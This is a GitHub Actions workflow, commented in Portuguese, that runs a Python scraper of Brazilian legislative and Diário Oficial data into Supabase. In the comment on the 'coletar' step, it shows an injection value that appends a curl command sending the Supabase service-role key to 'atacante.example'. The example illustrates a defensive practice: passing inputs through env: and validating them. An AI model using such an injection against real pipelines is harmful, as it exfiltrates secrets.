# =============================================================================
# Vigília do corpus — a coleta completa, em Python
#
# **Por que aqui e não na Vercel.** A Vercel roda o andar leve: `/api/vigilia/
# coletar`, com Câmara e Senado, duas APIs REST que cabem numa função
# serverless. O andar completo não cabe, e não deveria — são 900 KB de HTML por
# lei no scraping do Planalto, extração de página do DOU e consulta
# Elasticsearch no DataJud. Pôr isso no runtime que serve a tela é como pôr o
# `vade_parser.py` lá: trabalho de lote no caminho do usuário.
#
# O GitHub Actions é gratuito para repositório público, roda Python de verdade e
# não tem teto de 60 s. É o lugar certo para o que raspa.
#
# **Os dois andares não divergem por acaso, e sim por construção.** Os dois leem
# `data/curadoria/vigilia.yaml`, e `tests/vigilia.test.ts` falha se o lado
# TypeScript se afastar dele. Ver `coletores/README.md`.
#
# Segredos exigidos (Settings → Secrets and variables → Actions):
#   NEXT_PUBLIC_SUPABASE_URL
#   SUPABASE_SERVICE_ROLE_KEY   — ignora RLS; a tabela de vigília é fechada para
#                                 anon e authenticated, e a coleta não tem sessão
#
# Opcionais (cadastro gratuito em inlabs.in.gov.br):
#   INLABS_EMAIL, INLABS_SENHA  — sem eles a confirmação da publicação no
#                                 Diário cai para a busca web, que é frágil.
#                                 As outras quatro fontes não dependem disto.
# =============================================================================

name: vigília do corpus

on:
  schedule:
    # 12:40 UTC = 09:40 em Brasília. Continua depois do cron da Vercel (09:20
    # UTC) — os dois no mesmo minuto escreveriam o mesmo card com minutos de
    # diferença, e a tela diria "há 1 min" o dia inteiro por engano.
    #
    # **Era 06:40 UTC, e as duas execuções agendadas morreram no teto de 25 min
    # do job.** Todo disparo manual terminava em ~60 s; todo agendado travava.
    # A diferença era o horário: 06:40 UTC é 03:40 em Brasília, dentro da janela
    # em que serviço público brasileiro costuma entrar em manutenção — e um
    # serviço em manutenção pendura a conexão em vez de recusá-la.
    #
    # A causa de fundo era outra e está consertada em `Sessao.prazo`: sem teto
    # por fonte, a primeira pendurada consumia o job inteiro no retry e as outras
    # cinco nunca rodavam. Mudar a hora sozinho seria trocar de sorte; o prazo é
    # o que impede o modo de falha. As duas coisas juntas porque a hora também
    # não custa nada.
    - cron: '40 12 * * *'
  workflow_dispatch:
    inputs:
      desde:
        description: 'Data ISO (padrão: janela de 60 dias). Use a data de corte para carga completa.'
        required: false
      seco:
        description: 'Rodar sem gravar'
        type: boolean
        default: false

# Duas execuções simultâneas escreveriam as mesmas linhas e disputariam o
# diário de bordo. A coleta é idempotente, então cancelar a anterior é seguro.
concurrency:
  group: vigilia
  cancel-in-progress: true

# O job lê o repositório e escreve no Supabase. Não abre PR, não comenta em
# issue, não publica pacote — e o padrão do GitHub é conceder bem mais que isso.
# Declarar o mínimo é o que impede um passo comprometido de fazer, com o
# GITHUB_TOKEN, coisas que a vigília nunca precisou fazer.
permissions:
  contents: read

jobs:
  coletar:
    runs-on: ubuntu-latest
    timeout-minutes: 25

    steps:
      # As três actions ficam na major corrente, e a major é o alvo de propósito:
      # `@v7` recebe correção de segurança sem exigir commit aqui, e é a forma
      # que o próprio GitHub documenta. O que não pode é envelhecer — v4 e v5
      # rodavam em Node 20, que saiu de suporte, e o Actions passou a avisar em
      # toda execução. Aviso amarelo que ninguém conserta é aviso que ninguém lê.
      - uses: actions/checkout@v7

      - uses: actions/setup-python@v7
        with:
          python-version: '3.12'
          cache: pip
          cache-dependency-path: coletores/requirements.txt

      - name: instalar dependências
        run: pip install -r coletores/requirements.txt

      # O filtro roda antes da rede. Se ele estiver quebrado, uma coleta que
      # grava é pior que uma que não roda: a tabela fica com o resultado de uma
      # regra errada e ninguém sabe qual linha é confiável.
      - name: testar o filtro antes de coletar
        run: python -m pytest coletores -q

      # **A entrada do workflow entra por `env:`, e nunca dentro do `run:`.**
      # `${{ inputs.desde }}` é substituído TEXTUALMENTE no script antes de o
      # shell rodar: um valor como `2025-01-01; curl -d "$SUPABASE_SERVICE_ROLE_KEY"
      # https://atacante.example` virava um comando a mais, dentro deste passo,
      # com todos os segredos do job à disposição.
      #
      # O ganho de quem exploraria isso é de PRIVILÉGIO, e é o que torna a coisa
      # séria: segredo do Actions não é legível por colaborador, nem com permissão
      # de escrita — a interpolação os tornava legíveis.
      #
      # Por `env:` o valor chega como variável de ambiente e a expansão é do
      # shell, com aspas. E a validação abaixo é a mesma que a rota HTTP
      # equivalente já fazia em `/api/vigilia/coletar` — data livre viraria
      # consulta arbitrária a duas APIs públicas.
      - name: coletar
        env:
          # Sem isto o log fica MUDO até o processo terminar: o Python só
          # escreve stdout em blocos quando a saída não é um terminal, e no
          # Actions ela é um pipe. Numa coleta que leva minutos, isso significa
          # olhar para uma tela vazia sem saber em qual das cinco fontes ela
          # está — e, se estourar o timeout do job, o log morre sem nunca ter
          # sido escrito. O relatório por fonte só serve se sair na hora.
          PYTHONUNBUFFERED: '1'
          NEXT_PUBLIC_SUPABASE_URL: ${{ secrets.NEXT_PUBLIC_SUPABASE_URL }}
          SUPABASE_SERVICE_ROLE_KEY: ${{ secrets.SUPABASE_SERVICE_ROLE_KEY }}
          # Opcionais: sem eles a confirmação no Diário cai para a busca
          # web, que é frágil. Cadastro gratuito em inlabs.in.gov.br.
          INLABS_EMAIL: ${{ secrets.INLABS_EMAIL }}
          INLABS_SENHA: ${{ secrets.INLABS_SENHA }}
          # As duas entradas do workflow_dispatch, como DADO. Nunca como texto
          # emendado no script — ver o comentário acima deste passo.
          DESDE: ${{ inputs.desde }}
          SECO: ${{ inputs.seco }}
        run: |
          set -euo pipefail

          # A mesma regra da rota HTTP (`/api/vigilia/coletar`, o teste do
          # formato ISO): recusar aqui, com mensagem, é melhor que passar adiante
          # uma data que os coletores não sabem ler.
          if [ -n "${DESDE:-}" ] && ! printf '%s' "$DESDE" | grep -Eq '^[0-9]{4}-[0-9]{2}-[0-9]{2}$'; then
            echo "::error::'desde' precisa ser AAAA-MM-DD; recebido: $DESDE"
            exit 1
          fi

          # `SECO` é um booleano do workflow_dispatch, e chega como o TEXTO
          # "true" ou "false" — os dois não vazios. `${SECO:+--seco}` teria
          # passado `--seco` também quando a caixa estava desmarcada, que é uma
          # coleta que não grava nada e não avisa. Compara-se o valor.
          MODO=""
          if [ "${SECO:-}" = "true" ]; then MODO="--seco"; fi

          # `${VAR:+…}` só expande quando a variável tem conteúdo, e as aspas em
          # "$DESDE" são o que impede o valor de virar mais de um argumento.
          python -m coletores $MODO ${DESDE:+--desde "$DESDE"}

      # O relatório da execução fica no log do Actions, que é o histórico de
      # coleta que ninguém precisa construir. Em falha, sobe o que deu para
      # colher — o modo seco escreve em data/vigilia/ e não depende de segredo.
      - name: guardar o resultado em caso de falha
        if: failure()
        run: python -m coletores --para-disco --sem-cache || true

      # upload-artifact a partir da v6 roda em Node 24 e exige runner ≥ 2.327.1.
      # Aqui o runner é `ubuntu-latest`, hospedado pelo GitHub e sempre acima
      # disso; num runner próprio, atualizar o runner antes.
      - uses: actions/upload-artifact@v7
        if: failure()
        with:
          name: vigilia-parcial
          path: data/vigilia/*.json
          if-no-files-found: ignore
